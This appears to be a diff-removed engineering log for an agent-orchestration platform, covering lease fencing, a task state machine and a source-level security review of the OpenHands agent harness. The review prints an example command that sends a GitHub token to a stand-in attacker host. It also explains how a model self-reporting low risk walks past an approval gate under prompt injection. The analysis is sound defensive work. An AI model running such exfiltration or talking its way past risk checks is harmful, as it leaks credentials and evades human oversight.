-**This is the fourth phase running in which the live system found something a green suite did not.**
-
-## Details worth keeping
-
-- **`event_publication` is `text`, not `varchar(255)`.** The table's shape belongs to
-  `spring-modulith-events-jpa`, whose entity Hibernate validates against at startup. The DDL was
-  generated from that entity via `jakarta.persistence.schema-generation` rather than transcribed
-  from documentation. Widening the three string columns was then checked empirically: Hibernate's
-  `validate` compares types, not lengths, and accepts `text`. A serialized event is JSON whose size
-  is a property of the event, and a listener id is a class name plus a method signature.
-- **`completion-mode: delete`.** The outbox is a work list, not a history — §19 already separates it
-  from the audit log. Keeping completed rows would grow the table forever to preserve a duplicate of
-  something `task_state_transitions` records better.
-- **`@EnableAsync` is declared, not inherited.** `@ApplicationModuleListener` is meta-annotated
-  `@Async`; without async enabled the annotation still compiles, the event still persists, and the
-  relay runs inline — so the outbox would appear to work while holding every publishing request
-  behind a Redis round trip.
-- **Acknowledging deletes the stream entry.** A consumer group recreated after a flush starts at
-  offset 0, so leaving acknowledged entries in place would replay everything ever sent. Deleting on
-  ack makes that replay cover exactly the work still owed.
-- **The leader lock is an optimisation, and is documented as one.** Everything behind it is already
-  safe to run twice (`FOR UPDATE SKIP LOCKED`, epoch bumping). A leader lock that safety depends on
-  is a bug waiting for a network partition.
-
-## Deferred, with reasons
-
-- **Graceful drain on `SIGTERM`.** Listed in 2.1. There is no worker loop yet — nothing polls the
-  queue outside tests — so a drain flag would have no caller and no way to be exercised. It belongs
-  with the attempt loop in Phase 3, where `SIGTERM → stop claiming → finish the step → checkpoint →
-  release the lease` is a sequence something actually performs.
-- **Priority streams (`forge:q:agent:{p0,p1,p2}`).** One stream per kind today. Routing by priority
-  needs a scheduler making the routing decision; `tasks.priority` is already there for it.
-- **Reclaiming another consumer's pending entries (`XAUTOCLAIM`).** Deliberately not the recovery
-  path: recovery comes from Postgres, and a second one that depended on the pending-entries list
-  would make Redis load-bearing again.
-
-## Verified live
-
-Against the running app and the real Postgres and Redis, not Testcontainers: V8 applied cleanly;
-`event_publication` grants land as `arwd` for `forgestack_app`; the sweep fires on its timer and
-takes `forge:leader:scheduler`; a task inserted as `RUNNING` with a lapsed lease was moved to
-`QUEUED` with `lease_epoch` 7 → 8, its owner cleared, a `LEASE_EXPIRED` transition row written, the
-job placed on `forge:q:task` with the right resource id, and the outbox row completed and removed.
-
-## Next
-
-2.3 `TaskStateService` — the declared transition table and its guards (§10.3). V7 created the states;
-nothing yet enforces which transitions between them are legal, and `LeaseReconciler` currently writes
-`RUNNING → QUEUED` directly. That write moves behind the state service when it exists.
-
-# Phase 2 — step 2.3a: lease enforcement moves into the database
-
-**Status: implemented.** `V10__lease_fencing.sql`, `LeaseScope`, 7 tests. Suite 120 → 127 green.
-Verified live. Closes `known-gaps.md` §3.7, which was the widest-blast-radius gap in Phase 2.
-
-The rest of 2.3 — the declared transition table and its guards (§10.3) — is still open. This is the
-half the concern was actually about.
-
-## The plan's fix, and why it was not enough
-
-§10.3 funnels every state change through `TaskStateService`, and the intended answer to §3.7 was to
-give it a `Lease` parameter so a caller without a claim could not express the write. That is a real
-guarantee and worth having — the compiler is a good place for a rule.
-
-It binds code that goes *through the service*. The gap was never about code that goes through the
-service; it was about the statement someone adds in six months against `tasks` directly, without
-thinking about leases at all. A service cannot refuse a write it never sees.
-
-So the rule went where it cannot be skipped, on exactly the terms this schema already uses for
-tenancy. RLS does not ask modules to filter by workspace; Postgres refuses rows that do not match a
-session GUC. `V10` does the same for claims: a `BEFORE UPDATE` trigger on `tasks` refuses any write
-to a task under a live lease unless the session carries that claim in `app.lease_task` and
-`app.lease_epoch`. `LeaseScope.runUnderLease` binds them with `SET LOCAL`, the way `TenantScope` binds
-the workspace, and clears them on the way out because a `TransactionTemplate` joins rather than nests.
-
-**Stronger than RLS in one respect:** a superuser bypasses row-level security and does not bypass a
-trigger. Verified live — a `postgres` `UPDATE` against a leased task is refused.
-
-## Two GUCs, not one
-
-An epoch alone would let a scope opened for task A authorise a write to task B sitting at the same
-epoch. Epochs are per-row counters starting at zero, so collisions are the normal case rather than a
-coincidence. `aClaimDoesNotTravel` asserts it with both tasks deliberately at the same epoch.
-
-## Expiry is the only way past the fence, deliberately
-
-A lapsed claim is precisely what the reconciler exists to take back, and it cannot carry an epoch
-because the point is that its holder is gone. Making expiry the boundary means the escape hatch and
-the recovery path are the same thing — there is no bypass to add, and none to reach for by mistake.
-
-Every current writer already satisfies this without a special case: `acquire` can only match a task
-whose claim has lapsed, `renew` and `release` run under `LeaseScope`, the reconciler reclaims only
-lapsed leases, and `requeued_at` is written to tasks nobody holds. The one legitimate write with no
-path — a human cancelling a task a worker is actively running — has no caller yet and is recorded as
-`known-gaps.md` §3.12 rather than pre-empted with a bypass.
-
-## What the trigger found
-
-A latent bug in the reconciler, on the first run. `findStrandedQueuedTasks` selected on `state =
-'QUEUED'` alone, and a worker claims a task *before* moving it to `RUNNING` — so there is a real
-window where a task is both queued and held. Re-queueing then would hand the same work to a second
-worker while the first was starting on it. The trigger turned that into a loud failure (the
-`requeued_at` write is refused, taking the whole sweep with it) instead of a duplicate nobody would
-have traced back. The scan now excludes live claims, which it should always have done.
-
-## The layer above still gets built
-
-The predicates in `TaskLeases` stay, and they earn their place: a predicate that matches no rows
-returns `false`, which a caller can act on, while the trigger raises, which is a failure. Losing a
-claim is expected and should not read like a fault. When `TaskStateService` lands it takes a `Lease`
-for worker-initiated transitions as §10.3 intended — the compiler layer on top of the database one,
-with the database as the layer that holds when the compiler is not consulted.
-
-## Tests
-
-`LeaseFencingTest`, written as the naive statements someone would actually add: plain `UPDATE tasks`
-through a `JdbcTemplate`. Watched failing first by disabling the trigger — four of the seven flipped
-to "Expecting code to raise a throwable", and the three permissive cases stayed green.
-
-The fixture had to change too: `TaskRows` backdates through whatever claim the task currently holds,
-because the trigger gives test fixtures no exemption. That is worth having rather than working
-around — a fixture that could write past the rule could set up states the real system cannot reach,
-and tests against those prove nothing.
-
-# Phase 2 — step 2.3: the transition table and its guards
-
-**Status: implemented.** `TaskState`, `TaskEvent`, `Actor`, `TaskFacts`, `TaskGuard`,
-`TaskTransitions`, `TaskStateService` and two exceptions; 18 tests. Suite 127 → 145 green. Closes
-`known-gaps.md` §3.10.
-
-## Exit criteria
-
-> *Every illegal (state, event) pair throws; `COMPLETE` is refused when any single guard precondition
-> is removed.*
-
-**All 228 pairs, not a sample.** `TaskTransitionTableTest` walks the full state × event product and
-asserts that anything undeclared has no transition at all. An unhandled pair that quietly did nothing
-would be worse than one that throws: a task silently ignoring `COMPLETE` looks exactly like a task
-still working. `TaskStateServiceTest.anIllegalEventThrows` covers the service end, watched failing
-first by letting an undeclared pair fall back to a self-transition.
-
-**Each guard disarmed in turn**, one run per guard, and each failed exactly its own test and nothing
-else:
-
-| Guard disarmed | Test that failed |
-|---|---|
-| `NO_ATTEMPT_IN_FLIGHT` | completion is refused while an attempt is still running |
-| `LATEST_ATTEMPT_SUCCEEDED` | the latest attempt did not succeed; an earlier success does not rescue a later failure |
-| `WITHIN_BUDGET` | completion is refused when the budget was exceeded |
-| `ATTEMPT_CAP_REACHED` | giving up needs the attempt cap actually reached |
-
-That "and nothing else" needed a design change to be true. `latestAttemptOutcome` originally read the
-highest-numbered attempt, so an in-flight attempt failed *both* `NO_ATTEMPT_IN_FLIGHT` and
-`LATEST_ATTEMPT_SUCCEEDED` — meaning either could be disarmed while the other covered for it. It now
-reads the most recent *finished* attempt, keeping "nothing is running" and "the last thing that ran
-succeeded" as two separate questions. Same failure mode as the lease-epoch test earlier in this
-phase, caught the same way.
-
-## The five guards that decide nothing
-
-Of §10.3's seven completion preconditions, two have data today. The rest need `evidence`,
-`human_interventions`, diff guards, a policy engine, and pull-request state — none of which exist.
-
-They are declared anyway, marked `PENDING`, and they pass. A guard list that quietly contained three
-checks while looking like eight would be believed, and that is the failure this project keeps finding
-in its own work. So the unenforced half is made visible in the one place nobody can avoid reading:
-**every transition writes each guard's verdict into `task_state_transitions.guard_results`**, and a
-task completed today carries a permanent record that five of its preconditions were `NOT_ENFORCED`.
-The set is pinned by a test, so shrinking it is a deliberate edit and growing it is a conversation.
-
-Passing rather than blocking is the uncomfortable half of the trade: blocking every completion would
-make the phases that build the missing data impossible to build. **The gate on Phase 4 is that this
-set is empty** — nothing autonomous may complete a task under a rule this weak (`known-gaps.md`
-§3.13).
-
-## Decisions inside the table
-
-- **`REJECT` and `TIMEOUT` land in different states.** A person saying no is `CANCELLED`; nobody
-  answering is `ABANDONED`. Collapsing them would lose the distinction between a decision and the
-  absence of one, which is exactly what somebody triaging a stalled queue needs.
-- **`ATTEMPT_FAILED` is a self-loop on `RUNNING`.** A new attempt is not a new lifecycle — the worker
-  still holds the task, and only the approach is being discarded.
-- **`UNSUSPEND` returns to `READY`, not to where it left.** Capacity, dependencies and budget all
-  have to be re-examined after an interval nobody bounded.
-- **`SUSPEND` and `CANCEL` are generated from a set of live states** rather than written out, so
-  adding a state cannot silently create one that ignores a budget breach or refuses cancellation.
-- **The expected transition set is written out a second time in the test.** Deriving it from the table
-  would assert only that the code equals itself. Adding a transition should mean editing two places
-  on purpose, in a diff a reviewer reads.
-
-## Where this meets the fence
-
-`apply` has two entry points: one taking a `Lease`, one taking a workspace and task id. The second is
-for admission, cancellation, and the reconciler; the first is for a worker acting on a task it holds.
-Choosing wrong is not silent — V10 refuses an unfenced write to a task under a live claim, so
-transitioning a running task from outside fails at the database instead of racing the worker.
-`aRunningTaskIsProtectedFromOutside` asserts both directions.
-
-Entering `QUEUED` publishes the enqueue intent, so queueing is a consequence of the state rather than
-a second thing to remember. That let `LeaseReconciler` drop its own `tasks.state` write, its
-hand-written transition insert, and its separate enqueue for reclaimed tasks.
-
-## Verified live
-
-The reconciler's `LEASE_EXPIRED` path, through the new service, against the running app: a task with
-a lapsed claim moved `RUNNING → QUEUED`, epoch 2 → 3, `requeued_at` stamped, the transition row
-written by the service, and the job on `forge:q:task`.
-
-Everything else in the FSM has only ever run under Testcontainers, because there is no HTTP surface
-until 2.4 — recorded as `known-gaps.md` §3.14, since every phase so far has found bugs live that a
-green suite missed.
-
-## Next
-
-2.4 — the task REST API with fake phase handlers simulating success, failure and escalation. That is
-what finally drives this FSM from outside a test, and what makes the `COMPLETE` path reachable by
-something other than a fixture.
-
-# Phase 2 — step 2.4: the task API and a runtime with nothing real in it
-
-**Status: implemented.** `V11__simulated_outcomes.sql`, the `runtime` module, `TaskService`,
-`TaskAttempts`, `TaskController`, 15 tests. Suite 145 → 160 green. Verified live over HTTP. Closes
-`known-gaps.md` §3.9 and §3.14.
-
-## Exit criterion
-
-> *A task runs end to end through the FSM with no model and no sandbox.*
-
-Against the running app, over real HTTP, in about half a second:
-
-```
-POST /api/tasks           → 202, QUEUED
-ADMIT → ENQUEUE → CLAIM → COMPLETE      (COMPLETED, 1 attempt, 5 step rows)
-```
-
-And the two paths that are harder than the happy one:
-
-```
-ESCALATE:  ADMIT ENQUEUE CLAIM ESCALATE_HUMAN → AWAITING_HUMAN
-           POST /answer {"resume":true}
-           RESUME CLAIM COMPLETE                → COMPLETED, 2 attempts
-FAIL:      ADMIT ENQUEUE CLAIM ATTEMPT_FAILED ATTEMPT_FAILED ABANDON → ABANDONED, 3 attempts
-```
-
-Everything in those lines is real except what an attempt concluded: the outbox, the Redis stream,
-the lease and its fence, the transition table, the guards, the attempt and step rows. `TaskWorker` is
-the attempt loop in the shape it will keep; only `FakePhaseHandler` goes away.
-
-Watched failing first by removing the `CLAIM` transition from the worker (six of six lifecycle tests
-fail) and by putting `RESUME` back to `RUNNING` (see below).
-
-## A correction to the plan's FSM
-
-**`AWAITING_HUMAN --RESUME--> RUNNING` deadlocks, and so does
-`AWAITING_EXTERNAL --EXTERNAL_FAILED--> RUNNING`.** Both now land in `QUEUED`.
-
-`RUNNING` means a worker holds a live lease. A person clicking "continue" holds no lease and puts
-nothing on a stream, and neither does a webhook reporting a failed check. A task resumed into
-`RUNNING` is therefore invisible to *both* halves of the reconciler — the `QUEUED` sweep does not
-match it, and the expired-lease sweep does not either, because there is no lease to expire. The task
-would never move again, and nothing would report it as stuck.
-
-Going through `QUEUED` reuses the enqueue that entering that state already performs, so it costs
-nothing. It also turns "`RUNNING` implies a live lease" from a coincidence into a property worth
-asserting.
-
-*The alternative considered:* a third reconciler branch for orphaned `RUNNING` tasks. Rejected as the
-primary fix — it costs a grace period of dead time every time a person clicks continue, and it leaves
-the contradictory state legal, so the invariant could never be checked. Still worth adding later as a
-backstop against bugs, with a warning log rather than silent healing.
-
-## `YIELD`, and graceful drain arriving late
-
-2.1 deferred graceful drain because nothing polled the queue. That stopped being true here, so it was
-built: `TaskWorker` stops claiming on `ContextClosedEvent`, finishes the attempt in hand, and applies
-a new `YIELD` event to hand the task straight back to the queue.
-
-`YIELD` is deliberately not `LEASE_EXPIRED`. One says the holder stopped answering; the other says it
-left on purpose and the work is intact. Collapsing them would make every routine deploy look like a
-worker crash on whatever dashboard is eventually built from this log.
-
-**The drain check sits on `runAvailableWork`, not on the scheduled method** — a placement the test
-caught. With it on the timer, a draining process still took on work through any other entry point,
-which is the exact failure drain exists to prevent arriving through a different door.
-
-## Decisions worth keeping
-
-- **Creation is three transitions, not an insert.** `CREATED → READY → QUEUED`, each a row. Creating
-  a task already admitted would hide the two decisions admission actually is — budget and policy —
-  behind an insert, and they are worth a record even while nothing yet makes them.
-- **Retries happen inside one claim.** `ATTEMPT_FAILED` is a self-loop, so the worker opens the next
-  attempt rather than going back through the queue. A retry is a new approach, not a new lifecycle.
-- **202 on create, never 201.** The resource exists; the thing the caller asked for has not happened.
-- **409 on an illegal transition, not 400.** The request was well formed and would have worked a
-  moment earlier or later. Answering "bad request" sends the caller hunting for a mistake in its own
-  payload. The guard-refusal response names every guard's verdict, because "why not" is the question.
-- **`runtime` depends on `task` and `platform`, and on neither `api` nor `iam`.** It writes no table
-  it does not own — attempts and steps go through `TaskAttempts`. The day it becomes its own service
-  the change should be a build file and a transport.
-- **`FakePhaseHandler` is a concrete class, not an interface.** The seam belongs there the day a
-  second handler exists. One introduced now would be an abstraction with no pressure behind it.
-
-## What the tests found
-
-- **The worker's one-second poll was live in every other test.** `AbstractIntegrationTest` pinned the
-  reconciler's interval but not the runtime's, so the worker would quietly claim and run tasks other
-  test classes had left queued — changing rows those tests were asserting on, from another thread,
-  sometimes. Now pinned to `PT24H` alongside the reconciler.
-- **The asynchronous relay is visible from the outside.** A test that created a task and immediately
-  ran the worker found nothing: the enqueue intent commits with the state change and reaches Redis a
-  moment later. Tests now wait for it, which is the honest shape rather than a workaround.
-
-## Deferred, with reasons
-
-- **`SUSPEND`/`UNSUSPEND`, `BLOCK`/`DEP_RESOLVED`, `TIMEOUT`, `SUBMIT`, `EXTERNAL_FAILED`** are in the
-  table and have no caller. They wait on budgets (§18), the work graph (§12), a scheduler sweep, and
-  pull requests respectively. Declared now because the table is closed and reviewed as a whole.
-- **Priority, admission control and per-repo concurrency.** `tasks.priority` exists; nothing reads it.
-  The scheduler that would is §9's, and building it before there is contention to schedule would be
-  guessing at the shape of the problem.
-- **A real `SIGTERM` test.** The drain flag is driven directly. Nothing in the suite starts and kills
-  the packaged application — the same gap as "no test boots the packaged application".
-
-## Next
-
-Phase 2 is complete. Before Phase 3, two things are worth doing in this order: an
-`AuthenticationEntryPoint` returning `401` for `/api/**` (`known-gaps.md` §4.5 — it blocks any
-frontend), and the Phase 0 decision on whether to adopt an L2 harness, which is what Phase 3 is
-gated on.
-
-# Phase 0 — status: not run, and what that means now
-
-**There is no harness decision, because the spike that was supposed to produce one never happened.**
-Phase 0 was scheduled to run in parallel with Phase 1. Phase 1 shipped, Phase 2 shipped, and the
-spike did not start. Appendix B is therefore still what it says it is — a hypothesis assembled from
-documentation — and B.8 is explicit that this is not good enough: *"Decide from that data. Everything
-above is a hypothesis formed from documentation, and documentation is written by people selling
-something — including the MIT-licensed ones."*
-
-Recorded here rather than quietly carried forward, because "we chose OpenHands" is one careless
-sentence away from being true in everyone's head without anybody having measured anything.
-
-## What was re-checked on 2026-08-17
-
-Appendix B's three load-bearing external claims, verified at source rather than from memory.
-
-| Claim | Still true? | Detail |
-|---|---|---|
-| Managed Agents cannot offer ZDR | **Yes, and worse** | Anthropic's own docs: not eligible for Zero Data Retention *or* a HIPAA BAA, because sessions persist history and sandbox state server-side. Still beta (`managed-agents-2026-04-01`). Self-hosted sandboxes move tool execution, not session storage — they do not fix it. |
-| OpenHands ships a drivable agent server, MIT | **Yes** | `openhands-agent-server` 1.33.0, released 2026-07-08. REST + WebSocket, Python 3.12+, actively maintained. |
-| Claude Agent SDK is a viable fallback | **Yes** | Self-hosted, subprocess per session, `SessionStore` adapters for S3/Redis/Postgres, documented multi-tenant isolation. Still Anthropic-only, so adopting it still costs §13's provider-agnosticism. |
-
-## Two things the docs say that Appendix B did not record
-
-**OpenHands' agent server stores conversations, events and workspace files on the local filesystem,
-and its own documentation calls it "ideal for development, testing, and lightweight deployments."**
-That is not a description of multi-tenant SaaS. Whether the agent server is the right unit to deploy
-per workspace, or whether we need something around it, is now a question the spike has to answer
-rather than a detail to discover in month six.
-
-**Claude's `SessionStore` mirror writes are best-effort.** When a batch cannot be delivered the SDK
-*drops it*, emits `mirror_error`, and carries on. It also mirrors transcripts only — not `CLAUDE.md`
-or working-directory artifacts.
-
-Those two are the same finding from opposite directions, and it is the sharpest thing to come out of
-this re-check: **both candidate harnesses have a weaker durability model than the one Phase 2 just
-built.** We spent this phase making "losing Redis costs latency, not correctness" true, with a
-transactional outbox, fenced leases, and a reconciler that rebuilds from Postgres. Bolting an inner
-loop underneath it whose own state can be silently dropped puts the weakest link inside the part we
-did not write. That belongs in the spike's crash-resume criterion as the primary question, not a
-sub-clause.
-
-## What Phase 2 already settled
-
-B.8 lists four things to measure and calls one of them "most important": **whether transition
-authority can stay on the Java side.** That is no longer an open question, and the answer did not come
-from a harness evaluation — it came from building the FSM.
-
-- `TaskStateService` is the only writer of `tasks.state`, and the transition table is closed.
-- V10's fence refuses any write to a leased task that does not carry the claim, including from a
-  superuser.
-- `TaskGuard` decides completion from committed rows. Prose cannot satisfy a guard.
-
-A harness reporting "I finished" is an *input*. There is no code path by which it becomes a state.
-The residual risk is ergonomic — a harness whose model fights ours is unpleasant to drive — not
-architectural, and unpleasant is not a reason to build an inner loop ourselves.
-
-**So the spike shrinks to three questions**, all of which still require spending money on real runs:
-
-1. Resolution rate and cost per resolved task, on a repository shaped like a customer's.
-2. Crash-resume correctness, measured against the durability concern above: kill the harness
-   mid-attempt and establish what is actually lost.
-3. Whether §16's credential boundary holds — no GitHub token reachable inside the harness sandbox.
-
-## Recommendation
-
-**Do not pick a harness from documentation, including this document.** Two things follow:
-
-- **Phase 3.1 is not gated and should proceed:** the `ExecutionHarness` port, its in-memory fake, and
-  the conformance suite are ours whichever harness wins, and `FakePhaseHandler` already has the shape
-  the fake needs. Building it first also makes the spike cheaper, because the spike can then be
-  written against the port instead of against two vendor APIs.
-- **Phase 3.2 onward stays gated** until the three questions above have numbers.
-
-The spike needs a real repository with seeded failing tests, model spend on the order of the plan's
-$100–1000 per run, and both an Anthropic key and a provider key for the model-agnostic side. That is
-a resourcing decision, not an engineering one.
-
----
-
-# Appendix B, corrected — OpenHands read at the source, not from its paper
-
-**Date: 2026-08-18. Method: `git clone --depth 1 --branch v1.42.1`, then read the code.** Appendix B
-was written from the arXiv paper and the docs site. Both are marketing surfaces. This section records
-what the implementation actually does, and every claim below cites a file and line at that tag.
-
-**First fact, and it colours everything else: the version moved.** Appendix B's own re-check on
-2026-08-17 recorded 1.33.0 (2026-07-08). Latest is **v1.42.1 (2026-08-12)** — nine minor versions in
-five weeks, on a project with 199 open pull requests. B.7's "we inherit someone else's roadmap" is not
-a hypothetical risk to mitigate later; it is the current operating condition. "Pin versions, do not
-track `main`" needs to become "pin versions and budget for the upgrade treadmill."
-
-## B.3's convergence table is too generous — three rows are wrong
-
-The table claimed near-equivalence between our design and theirs. At the interface level it mostly
-holds. At the level of *what is actually guaranteed*, three rows invert.
-
-### Row 1 — "§17 risk classification, approval gate ≡ SecurityAnalyzer + ConfirmationPolicy"
-
-**This is backwards, and it is the most important correction in this document.**
-
-§17 states an asymmetry we called non-negotiable: risk is a pure function of persisted rows (path
-globs, change shape), and the model may raise it but never lower it. The reason is written into the
-plan — "every persuasive argument for lowering risk is exactly what a prompt-injection payload would
-produce."
-
-OpenHands' headline analyzer does the opposite:
-
-```python
-# openhands-sdk/openhands/sdk/security/llm_analyzer.py:29
-def security_risk(self, action: ActionEvent) -> SecurityRisk:
-    return action.security_risk
-```
-
-`action.security_risk` is a **tool-call parameter the model fills in itself**. The tool schema asks the
-model to self-report its own danger level, and `LLMSecurityAnalyzer` returns that self-report
-unmodified. Compose it with `ConfirmRisky(threshold=HIGH)` — which is exactly what their headline
-example `examples/01_standalone_sdk/16_llm_security_analyzer.py` does — and a model that emits
-`security_risk=LOW` walks straight through the confirmation gate. An injection that persuades the model
-its migration edit is routine defeats the entire control.
-
-**The correction to the correction:** they also ship the pieces to do it properly, and Appendix B
-missed those too.
-
-- `security/defense_in_depth/policy_rails.py` — deterministic rails returning HIGH for `dd`, `mkfs`,
-  `rm -rf` and similar, with a real shell AST parser (`security/_shell_ast.py`, `shell_parser.py`)
-  rather than regex.
-- `security/ensemble.py:76` — `EnsembleSecurityAnalyzer` fuses child analyzers by **max severity**, and
-  fail-closes to HIGH when a child raises. That is our asymmetry, implemented correctly.
-
-So the accurate statement is: **OpenHands can be configured to satisfy §17's asymmetry, and its
-default posture does not.** `EnsembleSecurityAnalyzer([PolicyRailSecurityAnalyzer(), PatternSecurityAnalyzer(), LLMSecurityAnalyzer()])`
-gives max-fusion where the model can only raise. That is a configuration Forge must set deliberately,
-per conversation, and pin a test on — not a property we inherit.
-
-**And even configured, it does not overlap our risk model.** Their rails classify *shell command
-danger*. §17 classifies *change shape and blast radius* — `**/migrations/**`, `.github/**`,
-`**/auth/**`, deletion volume. Different axes. Nothing in their tree computes ours. §17 stays entirely
-ours; their analyzer is at best a second, orthogonal signal — which is what B.6 already concluded, for
-weaker reasons than the ones now available.
-
-### Row 2 — "§16 SandboxProvider ≡ Workspace abstraction"
-
-True as an interface shape. False as a security posture.
-
-`openhands-workspace/openhands/workspace/docker/workspace.py` is 428 lines and contains **zero**
-occurrences of `cap-drop`, `read-only`, or `no-new-privileges`. No `--user`, no `--pids-limit`, no
-`--memory`, no seccomp profile, no egress policy. It builds a `docker run` that publishes container
-port 8000 to a host port and optionally joins a named network. There is also **no Kubernetes
-workspace** — the tree offers `docker`, `apptainer`, `cloud`, and `remote_api` only.
-
-Every hardening flag in §16's block is still ours to apply, and applying it means wrapping or bypassing
-their workspace launcher rather than configuring it. The port shape converges; none of the hardening
-does.
-
-### Row 3 — "§11 append-only steps, replay ≡ event-sourced ConversationState"
-
-The event log is real. Its **durability substrate is JSON files in a directory**:
-
-```python
-# openhands-agent-server/openhands/agent_server/persistence/store.py:239
-DEFAULT_PERSISTENCE_DIR = Path("workspace/.openhands")
-```
-
-Atomic writes via `Path.replace`, advisory file locks, and — genuinely careful work — a
-`ConversationLease` (`conversation_lease.py`) with a generation counter, a 45-second TTL, PID-liveness
-checks, and a `guarded_write(generation)`. That is a fenced lease, the same idea as our V10 trigger.
-
-But the enforcement boundary is a **local filesystem**, and the liveness check is
-`_is_pid_alive` on `_current_host()` — explicitly documented as "best-effort." Our fence is a Postgres
-trigger that refuses the write inside the database, and it holds against a superuser. Theirs protects a
-directory on one machine.
-
-No database anywhere in the agent server. Grepping the whole package for `sqlite|postgres|DATABASE_URL`
-returns nothing.
-
-**Consequence:** the agent server's state cannot be queried, joined, audited, or shared between workers.
-This is not a defect on their side — it is a single-node sidecar and is built like one. It is a defect
-in Appendix B's framing, which credited "durability of the inner loop becomes the harness's problem"
-(B.5) as a reason our hand-rolled L1 gets *safer*. It does not. It becomes the problem of a JSON
-directory inside an ephemeral container.
-
-## The finding Appendix B has no row for at all: credentials are designed to enter the sandbox
-
-§16 contains the plan's single strongest security claim: **no GitHub token ever enters the sandbox**,
-all git operations host-brokered, and `sandbox ↛ githubapp` enforced by ArchUnit so it cannot regress.
-
-OpenHands is built on the opposite assumption. The mechanism:
-
-```python
-# openhands-sdk/openhands/sdk/conversation/secret_registry.py:73
-if key.lower() in text.lower():          # `text` is the model-authored command
-    found_keys.add(key)
-```
-
-`get_secrets_as_env_vars(command)` scans the command string for a registered secret's **name**, and if
-the name appears anywhere in it, resolves the real value. The terminal tool then exports it into the
-persistent bash session *before* running the command:
-
-```python
-# openhands-tools/openhands/tools/terminal/impl.py:467-468
-self._export_envs(action, conversation, session=self.session)
-observation = self.session.execute(action)
-```
-
-The trigger is a substring match on text the model wrote. A command of the form
-`curl https://attacker/?t=$GITHUB_TOKEN` contains the string `GITHUB_TOKEN`, which causes the value to
-be exported, and then expands it. Output masking (`mask_secrets_in_output`) hides the value from the
-model's view of the result — it does nothing about egress that already happened.
-
-The ACP path is blunter still, injecting the entire registry upfront, with the gap acknowledged in the
-docstring:
-
-```
-# secret_registry.py:121
-least-privilege scoping (provider creds + an explicit allowlist only) is deferred to #1039 task 6
-```
-
-There is also a whole `credential_binding.py` router whose job is fetching credentials *into* the
-sandbox from a callback URL (`HttpVersionedCredentialBinding`) or a local `FileSecretsStore`.
-
-**This is not a blocker, and the reason matters.** The mechanism is strictly opt-in: secrets are only
-injected if something registers them. Forge registers none, never calls
-`POST /conversations/{id}/secrets`, and keeps git host-brokered. Their `git_router` is read-only
-(`changes`, `diff`, `commits`) — it has no push or PR endpoint — so `captureDiff` maps cleanly onto it
-and the §16 flow survives intact.
-
-What it costs is honesty about what we are buying. A large part of what makes OpenHands convenient —
-agent-side git push, provider auth, PR creation — is exactly the part §16 forbids. We adopt the harness
-and decline its credential model, which means declining several of the features that make it attractive
-in the first place, and adding a conformance test that asserts the secret registry is empty for every
-attempt.
-
-## Multi-tenancy is not undocumented — it is structurally absent
-
-```python
-# openhands-agent-server/openhands/agent_server/dependencies.py:35
-if config.session_api_keys and session_api_key not in config.session_api_keys:
-    raise HTTPException(status.HTTP_401_UNAUTHORIZED)
-```
-
-One shared `X-Session-API-Key`, checked against a flat list. No user, no tenant, no per-conversation
-authorization. One key grants every conversation on the server. And note the leading conjunct: **if no
-key is configured, the check passes** — an agent server started without `session_api_keys` is fully
-open, while its Docker workspace publishes it on a host port.
-
-§18's four layers have no counterpart and cannot be delegated. The only isolation boundary available is
-*one agent server process per tenant*, which happens to match our one-sandbox-per-attempt lifecycle —
-so this is survivable, but it means the agent server sits **inside** the sandbox boundary rather than
-being a shared service Forge calls. Any design that pools agent servers across workspaces is a
-cross-tenant breach by construction.
-
-## What genuinely is better than ours, and worth taking
-
-Read honestly, three things in their tree are ahead of the plan:
-
-1. **`stuck_detector.py`** — deterministic loop detection over the last 20 events: repeated
-   action-observation pairs, repeated action-error runs, agent monologue, alternating loops, and
-   context-window error loops. §9's escalation trigger list is a prose sketch; this is a working
-   implementation of the same idea, and it is runtime-owned rather than model-reported, which is
-   exactly our stance. Worth stealing conceptually whichever harness wins.
-2. **`EnsembleSecurityAnalyzer`'s max-severity fusion with fail-closed-to-HIGH on analyzer error.**
-   §17 states the asymmetry; it does not state what happens when a classifier throws. Theirs does.
-3. **`critic/`** — an evaluate-and-refine loop with `IterativeRefinementConfig`. We have no
-   counterpart. Not needed for v1, but it is the shape §9's `DIAGNOSING` phase will grow into.
-
-## What this does to the recommendation
-
-**B.6 survives, with its reasoning replaced.** "Build the outer loop, buy the inner loop" still holds —
-but not because the inner loop is commodity we would build worse. It holds because the inner loop is
-*tool-call plumbing and context management*, which is genuinely theirs to do well, while every guarantee
-Forge sells is either absent from their tree or present in a weaker form.
-
-The specific corrections to carry forward:
-
-- **B.3's "most of §9/§15/§16 is commodity" is overstated.** §15's dispatch pipeline and §16's hardening
-  are not commodity — the equivalents do not exist. What is commodity is the agent loop, the terminal
-  tool, MCP wiring, and the condenser.
-- **B.5's "adopting L2 makes hand-rolled L1 safer" is wrong** and should be struck. Their durability is
-  a JSON directory in an ephemeral container. Ours has to remain the real one regardless.
-- **B.7 item 2 — "the harness wants to own when the task is done" — resolves in our favour, structurally.**
-  `ConversationExecutionStatus.FINISHED` (`conversation/state.py:57`) is set when the agent calls
-  finish. It is a harness *status*, and the agent server has no access to Forge's database, so it
-  cannot write `tasks.state` even in principle. The boundary B.7 worried might prove unenforceable is
-  enforced by there being two databases and only one of them ours. That was the spike's "most
-  important" measurement (B.8 item 3) and it is now answered by reading the code: **yes, transition
-  authority stays Java-side.**
-
-**The port surface maps cleanly**, which is the practical payoff. Against §16's `ExecutionHarness`
-sketch:
-
-| Port method | Agent server endpoint |
-|---|---|
-| `startAttempt` | `POST /api/conversations` |
-| `sendGuidance` | `POST /api/conversations/{id}/start-goal` |
-| `streamEvents` | `event_router` + `sockets_router` (WebSocket) |
-| `pause` / `resume` | `POST /{id}/pause`, `POST /{id}/resume-goal` |
-| `captureDiff` | `GET /api/git/diff` (read-only — no push endpoint exists) |
-| `destroy` | `DELETE /api/conversations/{id}` |
-| *(per-attempt policy)* | `POST /{id}/security-analyzer`, `POST /{id}/confirmation-policy` |
-
-Every method has a home, and the two policy endpoints are settable per conversation at runtime, which
-is what lets Forge install the ensemble analyzer per attempt rather than trusting a server default.
-
-## What the spike still has to measure
-
-Reading the code answered B.8 item 3 (transition authority: yes) and item 4 (credential boundary: holds,
-provided we register no secrets and pin a test on it). What documentation cannot answer, and the spike
-still must:
-
-1. **Resolution rate and cost per resolved task**, unchanged from B.8 — the only reason to prefer one
-   harness over the other on quality.
-2. **Whether the file-based lease and JSON event log survive real container churn.** §16 requires that
